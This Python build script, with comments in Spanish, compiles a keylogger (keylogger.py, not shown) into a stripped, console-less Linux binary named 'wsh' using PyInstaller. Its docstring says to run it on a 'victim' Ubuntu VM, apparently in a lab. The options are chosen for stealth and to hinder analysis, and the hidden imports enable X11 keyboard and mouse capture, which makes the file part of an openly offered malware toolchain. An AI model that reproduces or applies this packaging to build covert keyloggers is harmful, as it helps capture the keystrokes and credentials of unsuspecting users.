"""
build.py
========
Script de compilación del keylogger con PyInstaller.
Ejecutar en la VM víctima Ubuntu 24.04 LTS.

Descripción
-----------
Compila keylogger.py en un único binario ELF autocontenido para Linux.
El binario no requiere Python instalado en el sistema víctima para ejecutarse.

Opciones de PyInstaller usadas
--------------------------------
  --onefile      -> un único binario sin dependencias externas
  --noconsole    -> sin ventana de terminal visible (modo silencioso)
                    En Linux: equivale a --windowed, suprime stdout/stderr
  --name wsh     -> nombre del binario de salida = 'wsh'
  --strip        -> elimina símbolos de debug (reduce tamaño, dificulta análisis)
  --hidden-import pynput.keyboard._xorg
               -> importación necesaria para el backend X11 de pynput en Linux

Uso (en la VM Ubuntu 24.04 víctima)
--------------------------------------
    # 1. Instalar dependencias
    pip3 install pynput cryptography pyinstaller --break-system-packages
    
    # 2. Compilar
    python3 build.py
    
    # 3. El binario se genera en:
    #    ./dist/wsh
    
    # 4. Hacerlo ejecutable y probarlo
    chmod +x dist/wsh
    ./dist/wsh

Nota sobre --break-system-packages
------------------------------------
Ubuntu 24.04 implementa PEP 668 que restringe pip en el entorno del sistema.
Se debe usar --break-system-packages o un entorno virtual (venv).
"""

import subprocess
import sys
import os

EXE_NAME = "wsh"

SRC_DIR     = os.path.dirname(os.path.abspath(__file__))
ENTRY_POINT = os.path.join(SRC_DIR, "keylogger.py")
DIST_DIR    = os.path.join(SRC_DIR, "dist")
BUILD_DIR   = os.path.join(SRC_DIR, "build_tmp")

cmd = [
    sys.executable, "-m", "PyInstaller",
    "--onefile",                              # binario único autocontenido
    "--noconsole",                            # sin terminal visible
    "--name", EXE_NAME,                       # nombre del binario: wsh
    "--distpath", DIST_DIR,                  # carpeta de salida
    "--workpath", BUILD_DIR,                 # carpeta temporal
    "--specpath", SRC_DIR,
    "--clean",                               # limpiar builds anteriores
    "--strip",                               # quitar símbolos de debug
    # Importaciones ocultas necesarias para pynput en Linux/X11
    "--hidden-import", "pynput.keyboard._xorg",
    "--hidden-import", "pynput.mouse._xorg",
    "--hidden-import", "Xlib.protocol.event",
    "--hidden-import", "Xlib.ext.xtest",
    "--hidden-import", "Xlib.ext.xfixes",
    ENTRY_POINT,
]

print("[build.py] Compilando keylogger.py -> wsh (binario Linux ELF)...")
print("[build.py] Esto puede tardar 1-2 minutos...")
print()

result = subprocess.run(cmd, check=False)

if result.returncode == 0:
    output = os.path.join(DIST_DIR, EXE_NAME)
    print(f"\n[build.py] Compilacion exitosa: {output}")
    print(f"[build.py] Tamanio: {os.path.getsize(output) / 1024 / 1024:.1f} MB")
    print(f"\n[build.py] Para ejecutar:")
    print(f"           chmod +x {output}")
    print(f"           {output}")
else:
    print(f"\n[build.py] Error en compilacion (codigo {result.returncode})")
    sys.exit(result.returncode)
